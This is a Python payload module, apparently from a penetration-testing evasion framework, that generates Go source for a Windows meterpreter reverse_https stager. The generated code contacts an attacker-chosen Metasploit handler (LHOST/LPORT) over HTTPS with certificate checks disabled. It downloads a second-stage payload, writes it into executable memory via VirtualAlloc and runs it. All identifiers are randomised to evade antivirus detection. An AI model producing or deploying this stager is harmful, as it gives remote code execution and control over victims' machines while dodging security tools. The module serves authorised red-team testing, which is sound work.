"""

Custom-written pure go meterpreter/reverse_https stager.


Module built by @b00stfr3ak44

"""

from modules.common import helpers
from random import randint


class Payload:

    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_https stager, no shellcode"
        self.language = "Go"
        self.extension = "go"
        self.rating = "Normal"

        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {
                                    "LHOST"          : ["", "IP of the Metasploit handler"],
                                    "LPORT"          : ["8443", "Port of the Metasploit handler"],
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"]
                                }
    def generate(self):
        memCommit = helpers.randomString()
        memReserve = helpers.randomString()
        pageExecRW = helpers.randomString()
        kernel32 = helpers.randomString()
        procVirtualAlloc = helpers.randomString()
        base64Url = helpers.randomString()
        virtualAlloc = helpers.randomString()
        size = helpers.randomString()
        addr = helpers.randomString()
        err = helpers.randomString()
        randBase = helpers.randomString()
        length = helpers.randomString()
        foo = helpers.randomString()
        random = helpers.randomString()
        outp = helpers.randomString()
        i = helpers.randomString()
        randTextBase64URL= helpers.randomString()
        getURI = helpers.randomString()
        sumVar = helpers.randomString()
        checksum8 = helpers.randomString()
        uri = helpers.randomString()
        value = helpers.randomString()
        tr = helpers.randomString()
        client = helpers.randomString()
        hostAndPort = helpers.randomString()
        port = self.required_options["LPORT"][0]
        host = self.required_options["LHOST"][0]
        response = helpers.randomString()
        uriLength = randint(5, 255)
        payload = helpers.randomString()
        bufferVar = helpers.randomString()
        x = helpers.randomString()
        payloadCode = "package main\nimport (\n\"crypto/tls\"\n\"syscall\"\n\"unsafe\"\n"
        payloadCode += "\"io/ioutil\"\n\"math/rand\"\n\"net/http\"\n\"time\"\n)\n"

        payloadCode += "const (\n"
        payloadCode += "%s  = 0x1000\n" %(memCommit)
        payloadCode += "%s = 0x2000\n" %(memReserve)
        payloadCode += "%s  = 0x40\n)\n" %(pageExecRW)

        payloadCode += "var (\n"
        payloadCode += "%s    = syscall.NewLazyDLL(\"kernel32.dll\")\n" %(kernel32)
        payloadCode += "%s = %s.NewProc(\"VirtualAlloc\")\n" %(procVirtualAlloc, kernel32)
        payloadCode += "%s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_\"\n)\n" %(base64Url)

        payloadCode += "func %s(%s uintptr) (uintptr, error) {\n" %(virtualAlloc, size)
        payloadCode += "%s, _, %s := %s.Call(0, %s, %s|%s, %s)\n" %(addr, err, procVirtualAlloc, size, memReserve, memCommit, pageExecRW)
        payloadCode += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" %(addr, err, addr)

        payloadCode += "func %s(%s int, %s []byte) string {\n" %(randBase, length, foo)
        payloadCode += "%s := rand.New(rand.NewSource(time.Now().UnixNano()))\n" %(random)
        payloadCode += "var %s []byte\n" %(outp)
        payloadCode += "for %s := 0; %s < %s; %s++ {\n" %(i, i, length, i)
        payloadCode += "%s = append(%s, %s[%s.Intn(len(%s))])\n}\n" %(outp, outp, foo, random, foo)
        payloadCode += "return string(%s)\n}\n" %(outp)

        payloadCode += "func %s(%s int) string {\n" %(randTextBase64URL, length)
        payloadCode += "%s := []byte(%s)\n" %(foo, base64Url)
        payloadCode += "return %s(%s, %s)\n}\n" %(randBase, length, foo)

        payloadCode += "func %s(%s, %s int) string {\n" %(getURI, sumVar, length)
        payloadCode += "for {\n%s := 0\n%s := %s(%s)\n" %(checksum8, uri, randTextBase64URL, length)
        payloadCode += "for _, %s := range []byte(%s) {\n%s += int(%s)\n}\n" %(value, uri, checksum8, value)
        payloadCode += "if %s%s == %s {\nreturn \"/\" + %s\n}\n}\n}\n" %(checksum8, '%0x100', sumVar, uri)

        payloadCode += "func main() {\n"
        payloadCode += "%s := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}\n" %(tr)
        payloadCode += "%s := http.Client{Transport: %s}\n" %(client, tr)
        payloadCode += "%s := \"https://%s:%s\"\n" %(hostAndPort, host, port)
        payloadCode += "%s, _ := %s.Get(%s + %s(92, %s))\n" %(response, client, hostAndPort, getURI, uriLength)
        payloadCode += "defer %s.Body.Close()\n" %(response)
        payloadCode += "%s, _ := ioutil.ReadAll(%s.Body)\n" %(payload, response)
        payloadCode += "%s, _ := %s(uintptr(len(%s)))\n" %(addr, virtualAlloc, payload)
        payloadCode += "%s := (*[990000]byte)(unsafe.Pointer(%s))\n" %(bufferVar, addr)
        payloadCode += "for %s, %s := range %s {\n" %(x, value, payload)
        payloadCode += "%s[%s] = %s\n}\n" %(bufferVar, x, value)
        payloadCode += "syscall.Syscall(%s, 0, 0, 0, 0)\n}\n" %(addr)

        return payloadCode
